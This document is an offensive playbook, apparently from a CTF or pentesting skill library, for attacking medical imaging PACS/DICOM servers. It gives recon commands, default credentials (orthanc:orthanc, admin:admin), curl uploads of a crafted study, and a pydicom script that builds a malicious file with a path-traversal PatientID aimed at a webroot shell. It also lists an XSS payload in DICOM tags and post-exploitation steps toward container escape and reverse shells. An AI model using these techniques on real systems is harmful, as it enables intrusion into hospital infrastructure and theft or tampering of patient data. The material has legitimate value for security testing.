# Archetype: Medical Imaging / DICOM / PACS

**Match if you see:** port **104** or **11112** (DICOM C-STORE / DIMSE) ·
`/dicom-web/`, `/wado`, `/qido`, `/stow`, `/studies` HTTP routes ·
Orthanc (`/app/explorer.html`, `Server: Orthanc`), DCM4CHEE, dcm4che,
OHIF viewer, `/pacs` · page copy: "studies", "series", "modality", "PACS",
"worklist", "DICOMweb" · uploads of `.dcm` / "imaging" / "scan" files ·
`pydicom` / `GDCM` / `ITK` in tracebacks.

**The mindset shift (this is the whole archetype):**
A PACS is an **upload pipeline with a medical skin** — treat it as
`upload-pipeline-deserialization.md` with DICOM-specific entry points. The
DICOM file is attacker-controlled structured data (tags, overlays, pixel data)
that a parser *and* a downstream worker (thumbnail, anonymizer, AI inference,
report) consume. The crown jewels are usually behind the parser, not the viewer.

## Fast checks (≤ 5 min)

```bash
# 1) DIMSE service alive (C-ECHO ping) — Orthanc/dcm4che default AE titles
echoscu -aec ANY-SCP <ip> 104          # or 11112; part of dcmtk
python3 -c "from pynetdicom import AE; from pynetdicom.sop_class import Verification; \
  ae=AE(); ae.add_requested_context(Verification); a=ae.associate('<ip>',104); \
  print(a.is_established); a.release()"

# 2) DICOMweb surface (often unauth on CTF/lab PACS)
curl -s http://target/dicom-web/studies            # QIDO-RS: list studies, no auth?
curl -s http://target/studies                       # OHIF/Orthanc proxy
curl -s http://target/system                         # Orthanc: version + plugins, unauth by default
curl -s -u orthanc:orthanc http://target/patients    # Orthanc default creds

# 3) STOW-RS upload surface (store a study over HTTP)
curl -s -X POST http://target/dicom-web/studies \
  -H 'Content-Type: application/dicom' --data-binary @malicious.dcm
```

## Attack surface, cheapest first

| EV | Vector | Check / note |
|----|--------|-------------|
| HIGH | **Unauth DICOMweb store** (STOW-RS `/dicom-web/studies`) or **C-STORE** on 104/11112 → push a crafted study the worker parses | `storescu <ip> 104 malicious.dcm`; watch for an anonymizer/AI/thumbnail job firing |
| HIGH | **Parser bug in pydicom / GDCM / dcmtk** on malformed pixel-data, overlays, or oversized tags → memory corruption / exception-path logic / path write | feed truncated/over-length pixel data, bad `TransferSyntaxUID`, crafted overlay group `60xx` |
| HIGH | **PACS → worker deserialization chain** — stored study consumed by a Python worker (`pickle`/`yaml`) or report generator | map the consumer per `upload-pipeline-deserialization.md`; pixel-data/private-tag blob is the carrier |
| MED | **Default / weak creds** — Orthanc `orthanc:orthanc`, DCM4CHEE `admin:admin`, exposed `/system` leaking version → CVE map | `recon-cve.sh "Orthanc <ver>"` |
| MED | **Path/filename injection via DICOM tags** — `PatientID`/`SOPInstanceUID` used to build the on-disk storage path → traversal / arbitrary write | set UID/ID tags to `../../` sequences, observe where the file lands |
| MED | **Private tags / embedded scripts rendered by the viewer** — OHIF/metadata panel reflects tag values → stored XSS in a clinician/admin session | inject `<img src=x onerror=...>` into a text VR tag |

## Build a malicious study (pydicom)

```python
import pydicom
from pydicom.dataset import Dataset, FileDataset
ds = FileDataset("x.dcm", Dataset(), file_meta=Dataset(), preamble=b"\0"*128)
ds.PatientID = "../../../../opt/pacs/webroot/shell"   # path-injection probe
ds.SOPInstanceUID = "1.2.3"
# oversized / malformed pixel data to stress the parser:
ds.Rows, ds.Columns = 2, 2
ds.PixelData = b"\xff" * 10_000_000   # length vs declared dims mismatch
ds.save_as("malicious.dcm", enforce_file_format=True)
```

## Rules that bite hardest here

- **The viewer is the decoy; the ingest parser is the target.** Don't spend
  time on the OHIF SPA — push a study and chase what *processes* it.
- **404 on a DICOMweb route answered once is answered forever (R17).** Confirm
  which of `/dicom-web/`, `/wado-rs`, `/studies`, `/pacs` the server actually
  mounts, then stop re-probing the dead prefixes.
- **A worker shell is not USER access.** Imaging workers are typically
  containerised; after exec run `postfoothold.sh` and pivot via
  `container-foothold.md` (writable bind-mount → root host service is the
  classic PACS escape).
- **Tag values are attacker input.** Any tag that becomes a filesystem path, a
  shell argument, a log line, or rendered HTML is an injection sink
  (creativity-catalog classes A, D, L).

## Matching skills

`upload-pipeline-deserialization.md` + `container-foothold.md` (the chain this
feeds into) · `container-escape-techniques` / `sandbox-escape-techniques`
(worker→host) · `xxe-xml-external-entity` (DICOM-SR / SOAP / metadata XML) ·
`reverse-shell-techniques`.
